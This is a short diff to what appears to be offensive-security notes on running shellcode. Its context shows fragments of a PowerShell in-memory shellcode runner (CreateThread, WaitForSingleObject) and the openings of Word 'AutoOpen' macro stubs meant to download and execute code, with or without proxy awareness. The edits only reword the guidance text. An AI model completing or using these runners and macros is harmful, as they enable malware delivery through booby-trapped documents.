@@ -78,7 +78,7 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
-Use this **(with proxy aware and user agent)**:
+Using this will detect proxy and with user agent, but might fail if the proxy server got AMSI? **(with proxy aware and user agent)**:
 
 ```vb
 Sub MyMacro()
@@ -104,7 +104,7 @@ Sub AutoOpen()
 End Sub
 ```
 
-Add this to a Microsoft Word Macro `AutoOpen()` **(without proxy aware and user agent)**:
+Using this if default proxy. Add this to a Microsoft Word Macro `AutoOpen()` **(without proxy aware and user agent)**:
 
 ```vb
 Sub MyMacro()
